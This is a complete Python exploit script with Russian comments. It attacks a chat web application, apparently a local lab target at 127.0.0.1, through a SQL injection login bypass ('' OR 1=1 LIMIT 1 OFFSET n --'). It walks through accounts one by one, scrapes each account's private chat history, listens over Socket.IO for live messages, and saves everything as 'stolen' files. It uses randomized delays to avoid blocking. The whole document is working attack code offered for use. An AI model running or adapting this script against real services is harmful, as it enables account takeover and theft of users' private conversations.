import socketio
import requests
from bs4 import BeautifulSoup
import os
import time
import random
import re
import json

# Конфигурация
HOST = "http://127.0.0.1:5000"    # Адрес для проведения атаки
WS_HOST = "http://127.0.0.1:5000" # Адрес для WebSocket (обычно совпадает)
MAX_OFFSET = 100                  # Максимальное количество аккаунтов для перебора
BASE_DELAY = 0.5                  # Базовая задержка между запросами (в секундах)
OUTPUT_DIR = "stolen_priv_mes"    # Директория для сохранения данных

# Создаем клиент Socket.IO
sio = socketio.Client()

def setup_socketio_handlers(username, chat_id, output_file):
    @sio.on('receive_private_message')
    def handle_message(data):
        """Обработчик входящих сообщений"""
        message = f"[{data['username']}]: {data['message']} (время: {data['timestamp']})\n"
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write(message)
        print(f"        Получено сообщение: {message.strip()}")

    @sio.on('connect')
    def on_connect():
        """Подключаемся к комнате чата после соединения"""
        sio.emit('join_private_chat', {'chat_id': chat_id})
        print(f"        WebSocket подключен к чату {chat_id}")

def get_csrf_token(session, url):
    """Получаем CSRF токен со страницы"""
    try:
        response = session.get(url)
        if response.status_code != 200:
            print(f"Ошибка {response.status_code} при получении CSRF токена")
            return None
        
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'csrf_token'})
        if not csrf_input:
            print("CSRF токен не найден на странице")
            return None
            
        return csrf_input.get('value')
    except Exception as e:
        print(f"Ошибка при получении CSRF токена: {str(e)}")
        return None

def extract_username(session):
    """Извлекаем имя пользователя из страницы аккаунта"""
    try:
        account_url = f"{HOST}/account"
        response = session.get(account_url)
        
        if response.status_code != 200:
            print(f"Ошибка {response.status_code} при доступе к аккаунту")
            return None
        
        # Используем регулярное выражение для поиска шаблона
        match = re.search(r'Добро пожаловать, @([^!]+)!', response.text)
        if match:
            return match.group(1)  # Извлекаем имя пользователя
        
    except Exception as e:
        print(f"Ошибка при извлечении имени пользователя: {str(e)}")
        return None

def process_private_chats(session, username):
    try:
        chats_url = f"{HOST}/my_private_chats"
        response = session.get(chats_url)
        if response.status_code != 200:
            print(f"Ошибка {response.status_code} при доступе к чатам")
            return
        
        soup = BeautifulSoup(response.text, 'html.parser')
        chat_table = soup.find('table')
        if not chat_table:
            print("    Таблица чатов не найдена")
            return
        
        chat_urls = set()
        for row in chat_table.find_all('tr')[1:]:
            buttons = row.find_all('button')
            for button in buttons:
                if button.text.strip() == 'Открыть':
                    onclick_js = button.get('onclick', '')
                    match = re.search(r"location\.href\s*=\s*'([^']+)'", onclick_js)
                    if match:
                        chat_url = match.group(1)
                        chat_urls.add(chat_url)
        
        if not chat_urls:
            print("    Приватные чаты не найдены")
            return
        
        print(f"    Найдено чатов: {len(chat_urls)}")
        user_dir = os.path.join(OUTPUT_DIR, username)
        os.makedirs(user_dir, exist_ok=True)
        
        for chat_url in chat_urls:
            chat_id = chat_url.split('/')[-1]
            print(f"      Обработка чата (ID: {chat_id})")
            extract_chat_messages(session, username, chat_id)
            
    except Exception as e:
        print(f"    Ошибка при обработке чатов: {str(e)}")

def extract_chat_history(session, chat_id):
    """Извлекает историю сообщений из HTML страницы чата"""
    try:
        chat_url = f"{HOST}/private_chat/{chat_id}"
        response = session.get(chat_url)
        if response.status_code != 200:
            print(f"        Ошибка {response.status_code} при получении истории чата")
            return []
        
        soup = BeautifulSoup(response.text, 'html.parser')
        messages = []
        
        # Находим контейнер сообщений по ID
        chat_box = soup.find('div', {'id': 'chat-box'})
        if not chat_box:
            print("        Контейнер сообщений (chat-box) не найден")
            return []
        
        # Ищем все элементы сообщений - каждый в отдельном div
        message_divs = chat_box.find_all('div')
        
        for msg_div in message_divs:
            try:
                # Извлекаем текст сообщения
                message_text = msg_div.get_text().strip()
                
                # Разбираем сообщение по шаблону: @username [timestamp]: message
                parts = re.match(r'^@([^\s]+)\s+\[([^\]]+)\]:\s+(.+)$', message_text)
                if parts:
                    username = parts.group(1)
                    timestamp = parts.group(2)
                    message_content = parts.group(3)
                    messages.append(f"[{username}]: {message_content} (время: {timestamp})")
                else:
                    # Если не удалось разобрать, сохраняем как есть
                    messages.append(message_text)
                
            except Exception as e:
                print(f"        Ошибка парсинга сообщения: {str(e)}")
                continue
        
        return messages
    except Exception as e:
        print(f"        Ошибка при извлечении истории: {str(e)}")
        return []

def extract_chat_messages(session, username, chat_id):
    try:
        # Подготовка файла для сохранения сообщений
        chat_dir = os.path.join(OUTPUT_DIR, username, chat_id)
        os.makedirs(chat_dir, exist_ok=True)
        output_file = os.path.join(chat_dir, "stolen_messages.txt")
        
        # Записываем метаданные в файл
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"Пользователь: {username}\n")
            f.write(f"ID чата: {chat_id}\n")
            f.write(f"URL чата: {HOST}/private_chat/{chat_id}\n\n")
            f.write("Сообщения:\n" + "="*50 + "\n")
        
        # Извлекаем историю сообщений
        history = extract_chat_history(session, chat_id)
        if history:
            print(f"        Найдено {len(history)} исторических сообщений")
            with open(output_file, 'a', encoding='utf-8') as f:
                for msg in history:
                    f.write(msg + '\n')
        
        # Настройка обработчиков Socket.IO
        setup_socketio_handlers(username, chat_id, output_file)
        
        # Подключаемся к серверу Socket.IO
        sio.connect(WS_HOST, headers={'Cookie': f'session={session.cookies.get("session")}'})
        print(f"        WebSocket подключен, ожидание сообщений...")
        
        # Увеличиваем время ожидания для захвата больше входящих сообщений
        time.sleep(10)
        
        # Отключаемся после сбора
        sio.disconnect()
        print(f"        Сообщения сохранены в {output_file}")
        
    except Exception as e:
        print(f"        Ошибка при извлечении сообщений: {str(e)}")
        if sio.connected:
            sio.disconnect()

def exploit_sql_injection():
    """Основная функция эксплуатации SQL-инъекции"""
    successful_logins = 0
    
    for offset in range(MAX_OFFSET):
        session = requests.Session()
        login_url = f"{HOST}/login"
        
        try:
            # Получаем CSRF токен
            csrf_token = get_csrf_token(session, login_url)
            if not csrf_token:
                print(f"[-] OFFSET={offset}: Пропускаем из-за ошибки CSRF")
                continue
            
            # Формируем SQL-инъекцию
            sql_payload = f"' OR 1=1 LIMIT 1 OFFSET {offset} --"
            login_data = {
                "username": sql_payload,
                "password": "any_password",
                "csrf_token": csrf_token,
                "submit": "Войти"
            }
            
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": login_url
            }
            
            # Случайная задержка для избежания блокировки
            delay = BASE_DELAY + random.uniform(0, 1)
            time.sleep(delay)
            
            # Отправляем запрос
            response = session.post(
                login_url,
                data=login_data,
                headers=headers,
                allow_redirects=False
            )
            
            # Проверяем успешность входа
            if response.status_code == 302 and "account" in response.headers.get("Location", ""):
                successful_logins += 1
                print(f"\n[+] Успешный вход с OFFSET={offset}")
                
                # Получаем имя пользователя
                username = extract_username(session)
                if not username:
                    username = f"user_{offset}"
                print(f"    Имя пользователя: {username}")
                
                # Обрабатываем приватные чаты
                process_private_chats(session, username)
            else:
                # Если получили код 200, останавливаем алгоритм
                if response.status_code == 200:
                    print(f"[-] OFFSET={offset}: Не удалось войти (код: 200). Прекращаем перебор.")
                    break
                else:
                    print(f"[-] OFFSET={offset}: Не удалось войти (код: {response.status_code})")
                
        except requests.exceptions.RequestException as e:
            print(f"[-] OFFSET={offset}: Ошибка сети - {str(e)}")
            break
        except Exception as e:
            print(f"[-] OFFSET={offset}: Неожиданная ошибка - {str(e)}")
            continue
    
    print(f"\nРезультат: всего успешных входов - {successful_logins}")

if __name__ == "__main__":
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    print(f"Начало эксплуатации SQL-инъекции на {HOST}")
    exploit_sql_injection()
    print("\nЭксплуатация завершена")
    
